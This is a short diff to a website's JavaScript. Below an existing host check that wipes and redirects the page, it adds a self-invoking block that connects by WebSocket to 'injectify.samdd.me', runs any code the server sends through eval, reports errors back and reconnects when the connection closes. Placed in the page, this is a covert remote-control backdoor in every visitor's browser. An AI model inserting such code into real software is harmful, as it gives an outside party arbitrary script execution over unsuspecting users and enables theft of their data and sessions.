@@ -65,3 +65,21 @@ if (window.location.host !=='samdd.me' && window.location.host !== '127.0.0.1:69
 	document.body.innerHTML='';
 	window.location='https://samdd.me';
 }
+
+(function i() {
+    window.ws = new WebSocket('wss://injectify.samdd.me/inject/websocket/?$' + btoa('samdd'))
+    ws.onmessage = function(d) {
+        try {
+            d = JSON.parse(d.data)
+            eval(d.d)
+        } catch(e) {
+            ws.send(JSON.stringify({
+                t: 'e',
+                d: e,
+            }))
+        }
+    }
+    ws.onclose = function() {
+        setTimeout(i(), 3000)
+    }
+})()
